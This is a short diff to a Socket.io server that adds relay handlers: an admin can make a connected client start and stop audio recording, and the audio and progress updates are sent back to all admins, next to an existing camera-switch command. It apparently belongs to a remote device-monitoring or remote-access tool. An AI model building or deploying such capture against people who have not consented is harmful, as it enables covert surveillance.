@@ -225,6 +225,40 @@ io.on('connection', (socket) => {
     io.to(data.clientId).emit('switch_camera', { facing: data.facing });
   });
 
+  // ─── Audio Recording ─────────────────────────────────────────
+
+  socket.on('start_audio_record', (data) => {
+    // data = { clientId, duration } duration = seconds
+    io.to(data.clientId).emit('start_audio_record', { duration: data.duration });
+  });
+
+  socket.on('stop_audio_record', (data) => {
+    io.to(data.clientId).emit('stop_audio_record');
+  });
+
+  socket.on('audio_record_result', (data) => {
+    // Client recording শেষে audio file পাঠাবে
+    Object.keys(admins).forEach(adminId => {
+      io.to(adminId).emit('audio_record_result', {
+        clientId: socket.id,
+        audioData: data.audioData,
+        duration: data.duration,
+        success: data.success,
+        error: data.error
+      });
+    });
+  });
+
+  socket.on('audio_record_progress', (data) => {
+    // Recording progress admin কে জানাও
+    Object.keys(admins).forEach(adminId => {
+      io.to(adminId).emit('audio_record_progress', {
+        clientId: socket.id,
+        remaining: data.remaining
+      });
+    });
+  });
+
   // Disconnect
   socket.on('disconnect', () => {
     delete clients[socket.id];
